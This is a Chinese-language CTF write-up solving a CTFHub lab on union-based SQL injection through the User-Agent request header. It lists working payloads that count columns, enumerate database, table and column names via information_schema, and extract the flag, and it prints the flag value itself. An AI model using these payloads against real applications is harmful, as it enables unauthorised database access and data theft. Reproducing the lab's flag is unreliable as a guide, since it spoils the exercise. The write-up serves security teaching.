# 题目:  CTFHub UA注入

## 题目描述
提示输入点在User‑Agent，注入点位于HTTP请求头 User‑Agent ，属于请求头Union联合SQL注入。
 
## 解题思路
1. 注入点位置： User‑Agent 请求头，不在Cookie、不在URL参数。
2. 数字型注入，联合查询回显位为第2列Data。
3. 靶场每次重启，flag存放的表名、字段名随机生成，不可硬编码为flag。
4. 流程：爆库名 → 爆表名 → 爆字段名 → 查询flag。
 
## 解题步骤
1. 验证注入，确认列数
将Payload写在User‑Agent头：
-1 union select 1,2
页面回显  ID:1 Data:2 ，确认一共2列

2. 查询数据库名
-1 union select 1,database()
   
3. 获取全部表名
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
得到表： news,etgjzpdbey ， etgjzpdbey 为flag所在随机表。

4. 获取flag表字段
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='etgjzpdbey'
得到字段： skpmhkluar 。

5. 查询flag数据
-1 union select 1,skpmhkluar from etgjzpdbey
页面拿到flag：
 ctfhub{10c7003c104cda06232e6f98} 
 
## 踩坑指南
1. Payload必须写在 User‑Agent 请求头，不要写到Cookie或者URL。
2. flag对应的表名、字段名每次开环境随机变化，不能直接写死flag。
使用 -1 使前面主查询结果为空，union查询的数据才可以正常回显。
 
## 知识点总结
1. HTTP头注入：SQL注入可以发生在 User‑Agent 、Referer这类请求头中。
2. Union联合查询：主查询返回空时，将子查询结果输出到页面回显位置。

3.  information_schema.tables  /  information_schema.columns  MySQL元数据表，用来获取库、表、字段信息。

4.  group_concat()  将多条结果拼接在同一行，适配页面单次回显。
